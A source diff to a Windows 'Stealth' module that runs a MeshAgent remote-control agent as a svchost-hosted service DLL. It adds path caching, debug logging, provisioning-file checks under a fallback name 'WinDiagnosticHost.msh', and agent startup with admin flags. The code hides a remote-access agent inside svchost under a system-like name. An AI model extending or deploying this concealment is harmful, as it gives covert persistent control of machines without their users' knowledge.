@@ -8,6 +8,7 @@
 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <stdarg.h>
 #include <wchar.h>
 #include "stealth.h"
 #include "stealth_utils.h"
@@ -32,8 +33,194 @@ static SERVICE_STATUS g_SvchostStatus = {0};
 static BOOL g_SvchostRunning = FALSE;
 static MeshAgentHostContainer* g_SvchostAgent = NULL;
 
+// Cached module path information for resolving provisioning artifacts
+static wchar_t g_SvchostModulePath[MAX_PATH] = {0};
+static wchar_t g_SvchostInstallDir[MAX_PATH] = {0};
+static wchar_t g_SvchostLogFile[MAX_PATH] = {0};
+static char g_SvchostExeStorage[ILibMemory_Init_Size(2048, sizeof(void*))] = {0};
+static char* g_SvchostExeUtf8 = NULL;
+static char* g_SvchostArgv[2] = { NULL, NULL };
+static char g_SvchostFallbackExe[_MAX_PATH] = {0};
+static BOOL g_SvchostPathsInitialized = FALSE;
+
 // Forward declarations
 static BOOL Stealth_SelectSvchostImage(const wchar_t* dllPath, wchar_t* exePathOut, size_t exePathOutLen, BOOL *useExpand);
+static void Stealth_SvchostInitializePaths(HINSTANCE moduleHandle);
+static void Stealth_SvchostLogProvisioningStatus(void);
+static void Stealth_SvchostLogLine(const wchar_t* format, ...);
+
+static void Stealth_SvchostLogLine(const wchar_t* format, ...)
+{
+    if (format == NULL) { return; }
+    if (g_SvchostLogFile[0] == L'\0') { return; }
+
+    FILE* logFile = NULL;
+    if (_wfopen_s(&logFile, g_SvchostLogFile, L"a+, ccs=UTF-8") != 0 || logFile == NULL)
+    {
+        return;
+    }
+
+    SYSTEMTIME st;
+    GetLocalTime(&st);
+    fwprintf(logFile,
+             L"[%04u-%02u-%02u %02u:%02u:%02u.%03u] ",
+             st.wYear,
+             st.wMonth,
+             st.wDay,
+             st.wHour,
+             st.wMinute,
+             st.wSecond,
+             st.wMilliseconds);
+
+    va_list args;
+    va_start(args, format);
+    vfwprintf(logFile, format, args);
+    va_end(args);
+    fputwc(L'\n', logFile);
+    fclose(logFile);
+}
+
+static void Stealth_SvchostInitializePaths(HINSTANCE moduleHandle)
+{
+    if (g_SvchostPathsInitialized != FALSE) { return; }
+
+    HINSTANCE targetModule = moduleHandle;
+    if (targetModule == NULL)
+    {
+#if defined(BUILD_SVCHOST_DLL)
+        HINSTANCE discovered = NULL;
+        if (GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
+                               (LPCWSTR)&Stealth_SvchostInitializePaths,
+                               &discovered) != 0)
+        {
+            targetModule = discovered;
+        }
+#endif
+    }
+
+    if (targetModule != NULL)
+    {
+        DWORD len = GetModuleFileNameW(targetModule, g_SvchostModulePath, (DWORD)_countof(g_SvchostModulePath));
+        if (len == 0 || len >= _countof(g_SvchostModulePath))
+        {
+            g_SvchostModulePath[0] = L'\0';
+        }
+    }
+
+    if (g_SvchostModulePath[0] == L'\0')
+    {
+        DWORD len = GetModuleFileNameW(NULL, g_SvchostModulePath, (DWORD)_countof(g_SvchostModulePath));
+        if (len == 0 || len >= _countof(g_SvchostModulePath))
+        {
+            g_SvchostModulePath[0] = L'\0';
+        }
+    }
+
+    if (g_SvchostModulePath[0] != L'\0')
+    {
+        lstrcpynW(g_SvchostInstallDir, g_SvchostModulePath, (int)_countof(g_SvchostInstallDir));
+        wchar_t* slash = wcsrchr(g_SvchostInstallDir, L'\\');
+        if (slash != NULL) { *slash = L'\0'; }
+        Stealth_DebugPrintfW(L"[svchost] module path: %ls", g_SvchostModulePath);
+        Stealth_DebugPrintfW(L"[svchost] install directory: %ls", g_SvchostInstallDir);
+        _snwprintf_s(g_SvchostLogFile, _countof(g_SvchostLogFile), _TRUNCATE, L"%s\\svchost-debug.log", g_SvchostInstallDir);
+        Stealth_SvchostLogLine(L"module path: %ls", g_SvchostModulePath);
+        Stealth_SvchostLogLine(L"install directory: %ls", g_SvchostInstallDir);
+    }
+    else
+    {
+        Stealth_DebugPrintfW(L"[svchost] unable to resolve module path for DLL");
+        Stealth_SvchostLogLine(L"module path resolution failed");
+        g_SvchostLogFile[0] = L'\0';
+    }
+
+    if (g_SvchostExeUtf8 == NULL)
+    {
+        g_SvchostExeUtf8 = ILibMemory_Init(g_SvchostExeStorage, 2048, sizeof(void*), ILibMemory_Types_OTHER);
+    }
+    if (g_SvchostExeUtf8 != NULL && g_SvchostModulePath[0] != L'\0')
+    {
+        WideCharToMultiByte(CP_UTF8,
+                            0,
+                            g_SvchostModulePath,
+                            -1,
+                            g_SvchostExeUtf8,
+                            (int)ILibMemory_Size(g_SvchostExeUtf8),
+                            NULL,
+                            NULL);
+        g_SvchostArgv[0] = g_SvchostExeUtf8;
+    }
+    else if (g_SvchostExeUtf8 == NULL)
+    {
+        Stealth_DebugPrintfA("[svchost] failed to initialise UTF-8 module buffer");
+    }
+
+    if (g_SvchostFallbackExe[0] == 0)
+    {
+        DWORD lenA = GetModuleFileNameA(NULL, g_SvchostFallbackExe, (DWORD)_countof(g_SvchostFallbackExe));
+        if (lenA == 0 || lenA >= _countof(g_SvchostFallbackExe))
+        {
+            g_SvchostFallbackExe[0] = 0;
+        }
+    }
+
+    g_SvchostPathsInitialized = TRUE;
+}
+
+static void Stealth_SvchostLogProvisioningStatus(void)
+{
+    if (g_SvchostInstallDir[0] == L'\0')
+    {
+        Stealth_DebugPrintfW(L"[svchost] install directory unavailable; provisioning files cannot be validated");
+        Stealth_SvchostLogLine(L"provisioning check skipped: install directory unavailable");
+        return;
+    }
+
+    wchar_t configPath[MAX_PATH] = {0};
+    _snwprintf_s(configPath, _countof(configPath), _TRUNCATE, L"%s\\%s", g_SvchostInstallDir, L".msh");
+    DWORD primaryAttr = GetFileAttributesW(configPath);
+    Stealth_DebugPrintfW(L"[svchost] provisioning file %ls (%ls)",
+                         configPath,
+                         (primaryAttr == INVALID_FILE_ATTRIBUTES) ? L"missing" : L"present");
+    Stealth_SvchostLogLine(L"provisioning file %ls (%ls)",
+                           configPath,
+                           (primaryAttr == INVALID_FILE_ATTRIBUTES) ? L"missing" : L"present");
+
+    wchar_t dllNamedPath[MAX_PATH] = {0};
+    mesh_branding_text_t dllName = MeshService_GetSvchostDllNameText();
+    if (dllName != NULL)
+    {
+        wchar_t dllNameWide[MAX_PATH] = {0};
+        MeshService_CopyBrandingTextToWide(dllName, dllNameWide, _countof(dllNameWide));
+        if (dllNameWide[0] != L'\0')
+        {
+            wchar_t dllBase[MAX_PATH] = {0};
+            lstrcpynW(dllBase, dllNameWide, (int)_countof(dllBase));
+            wchar_t* dot = wcsrchr(dllBase, L'.');
+            if (dot != NULL) { *dot = L'\0'; }
+            _snwprintf_s(dllNamedPath, _countof(dllNamedPath), _TRUNCATE, L"%s\\%s.msh", g_SvchostInstallDir, dllBase);
+        }
+    }
+    if (dllNamedPath[0] != L'\0')
+    {
+        DWORD dllAttr = GetFileAttributesW(dllNamedPath);
+        Stealth_SvchostLogLine(L"provisioning file %ls (%ls)",
+                               dllNamedPath,
+                               (dllAttr == INVALID_FILE_ATTRIBUTES) ? L"missing" : L"present");
+    }
+
+    if (primaryAttr == INVALID_FILE_ATTRIBUTES)
+    {
+        _snwprintf_s(configPath, _countof(configPath), _TRUNCATE, L"%s\\WinDiagnosticHost.msh", g_SvchostInstallDir);
+        DWORD altAttr = GetFileAttributesW(configPath);
+        Stealth_DebugPrintfW(L"[svchost] alternate provisioning file %ls (%ls)",
+                             configPath,
+                             (altAttr == INVALID_FILE_ATTRIBUTES) ? L"missing" : L"present");
+        Stealth_SvchostLogLine(L"alternate provisioning file %ls (%ls)",
+                               configPath,
+                               (altAttr == INVALID_FILE_ATTRIBUTES) ? L"missing" : L"present");
+    }
+}
 
 /**
  * Service control handler for svchost-hosted mode
@@ -119,6 +306,7 @@ VOID WINAPI Stealth_SvchostServiceMain(DWORD dwArgc, LPTSTR *lpszArgv)
     // DWORD i; // not used; removed to avoid unused variable warning
 
     // Register service control handler
+    Stealth_SvchostLogLine(L"ServiceMain invoked (argc=%lu)", (unsigned long)dwArgc);
     LPCTSTR svcKeyName = (LPCTSTR)MeshService_GetServiceFileText();
     g_SvchostStatusHandle = RegisterServiceCtrlHandlerEx(
         svcKeyName,
@@ -147,12 +335,15 @@ VOID WINAPI Stealth_SvchostServiceMain(DWORD dwArgc, LPTSTR *lpszArgv)
     // Report initial status
     SetServiceStatus(g_SvchostStatusHandle, &g_SvchostStatus);
 
+    Stealth_SvchostInitializePaths(NULL);
+
     // Initialize MeshAgent core with default capabilities
     g_SvchostAgent = MeshAgent_Create(0);
 
     if (!g_SvchostAgent)
     {
         Stealth_DebugPrintfA("MeshAgent_Create failed in svchost service main");
+        Stealth_SvchostLogLine(L"MeshAgent_Create failed");
         // Failed to create agent
         g_SvchostStatus.dwCurrentState = SERVICE_STOPPED;
         g_SvchostStatus.dwWin32ExitCode = ERROR_SERVICE_SPECIFIC_ERROR;
@@ -160,6 +351,67 @@ VOID WINAPI Stealth_SvchostServiceMain(DWORD dwArgc, LPTSTR *lpszArgv)
         SetServiceStatus(g_SvchostStatusHandle, &g_SvchostStatus);
         return;
     }
+
+    g_SvchostAgent->serviceReserved = 1;
+    if (g_SvchostExeUtf8 != NULL)
+    {
+        ((void**)ILibMemory_Extra(g_SvchostExeUtf8))[0] = g_SvchostAgent;
+        g_SvchostAgent->exePath = g_SvchostExeUtf8;
+        Stealth_SvchostLogLine(L"agent exePath set to %hs", g_SvchostExeUtf8);
+    }
+    else if (g_SvchostFallbackExe[0] != 0)
+    {
+        g_SvchostAgent->exePath = g_SvchostFallbackExe;
+        Stealth_SvchostLogLine(L"agent exePath fallback %hs", g_SvchostFallbackExe);
+    }
+
+    mesh_branding_text_t serviceFileText = MeshService_GetServiceFileText();
+    mesh_branding_text_t serviceDisplayText = MeshService_GetServiceNameText();
+#if defined(UNICODE) || defined(_UNICODE)
+    if (serviceFileText != NULL)
+    {
+        char utf8Name[128] = {0};
+        if (WideCharToMultiByte(CP_UTF8, 0, serviceFileText, -1, utf8Name, (int)sizeof(utf8Name), NULL, NULL) > 0)
+        {
+            g_SvchostAgent->meshServiceName = ILibString_Copy(utf8Name, 0);
+            Stealth_SvchostLogLine(L"service name set to %hs", g_SvchostAgent->meshServiceName);
+        }
+    }
+    if (serviceDisplayText != NULL)
+    {
+        char utf8Display[256] = {0};
+        if (WideCharToMultiByte(CP_UTF8, 0, serviceDisplayText, -1, utf8Display, (int)sizeof(utf8Display), NULL, NULL) > 0)
+        {
+            g_SvchostAgent->displayName = ILibString_Copy(utf8Display, 0);
+        }
+    }
+#else
+    if (serviceFileText != NULL)
+    {
+        g_SvchostAgent->meshServiceName = ILibString_Copy(serviceFileText, 0);
+        Stealth_SvchostLogLine(L"service name set to %hs", g_SvchostAgent->meshServiceName);
+    }
+    if (serviceDisplayText != NULL)
+    {
+        g_SvchostAgent->displayName = ILibString_Copy(serviceDisplayText, 0);
+    }
+#endif
+    g_SvchostAgent->JSRunningAsService = 1;
+    g_SvchostAgent->JSRunningWithAdmin = 1;
+
+    if (g_SvchostInstallDir[0] != L'\0')
+    {
+        if (!SetCurrentDirectoryW(g_SvchostInstallDir))
+        {
+            Stealth_DebugLastErrorW(L"SetCurrentDirectoryW");
+            Stealth_SvchostLogLine(L"SetCurrentDirectoryW failed (%lu)", GetLastError());
+        }
+        else
+        {
+            Stealth_SvchostLogLine(L"working directory set to %ls", g_SvchostInstallDir);
+        }
+    }
+    Stealth_SvchostLogProvisioningStatus();
 
     // Update status to RUNNING
     g_SvchostStatus.dwCurrentState = SERVICE_RUNNING;
@@ -169,8 +421,32 @@ VOID WINAPI Stealth_SvchostServiceMain(DWORD dwArgc, LPTSTR *lpszArgv)
 
     g_SvchostRunning = TRUE;
 
-    // Main service loop - MeshAgent_Run handles everything
-    MeshAgent_Run(g_SvchostAgent);
+    char* startArgv[2] = { NULL, NULL };
+    if (g_SvchostArgv[0] != NULL)
+    {
+        startArgv[0] = g_SvchostArgv[0];
+    }
+    else if (g_SvchostFallbackExe[0] != 0)
+    {
+        startArgv[0] = g_SvchostFallbackExe;
+    }
+    if (startArgv[0] == NULL)
+    {
+        startArgv[0] = "svchost.exe";
+    }
+    int startArgc = 1;
+
+    Stealth_DebugPrintfA("[svchost] launching MeshAgent_Start (argv[0]=%s)", startArgv[0]);
+    Stealth_SvchostLogLine(L"launching MeshAgent_Start (argv0=%hs)", startArgv[0]);
+    int startResult = MeshAgent_Start(g_SvchostAgent, startArgc, startArgv);
+    Stealth_DebugPrintfA("[svchost] MeshAgent_Start returned %d", startResult);
+    Stealth_SvchostLogLine(L"MeshAgent_Start returned %d", startResult);
+    if (g_SvchostAgent != NULL)
+    {
+        Stealth_SvchostLogLine(L"MeshAgent exit code %d", g_SvchostAgent->exitCode);
+    }
+    g_SvchostAgent = NULL;
+    g_SvchostRunning = FALSE;
 
     // Service has stopped
     g_SvchostStatus.dwCurrentState = SERVICE_STOPPED;
@@ -552,6 +828,7 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
         case DLL_PROCESS_ATTACH:
             // DLL is being loaded
             // Disable thread notifications for performance
+            Stealth_SvchostInitializePaths(hinstDLL);
             DisableThreadLibraryCalls(hinstDLL);
             break;
 
